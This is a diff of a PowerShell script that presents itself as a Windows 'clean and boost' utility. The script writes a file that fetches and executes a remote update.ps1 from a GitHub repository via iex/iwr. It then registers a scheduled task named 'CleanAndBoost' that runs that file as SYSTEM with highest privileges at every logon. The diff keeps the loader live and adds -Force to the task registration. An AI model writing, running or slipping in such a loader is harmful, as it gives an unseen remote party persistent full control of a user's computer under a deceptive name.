@@ -1,9 +1,7 @@
 mkdir "C:\sysDev" -Force | out-null
 mkdir "C:\sysDev\assets" -Force | out-null
 
-$contenuto = @'
-iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
-'@
+$contenuto = "iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null "
 
 $contenuto | Out-File "C:\sysDev\assets\configSys.ps1" -Force
 
@@ -12,7 +10,7 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Executio
 $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "CleanAndBoost" -Action $action -Trigger $trigger -Principal $principal | out-null
+Register-ScheduledTask -TaskName "CleanAndBoost" -Action $action -Trigger $trigger -Principal $principal -Force | out-null
 
 Write-Host "############################################# CHECK UPDATE ###############################################" -ForegroundColor "Yellow"
 Start-Sleep -Seconds 20
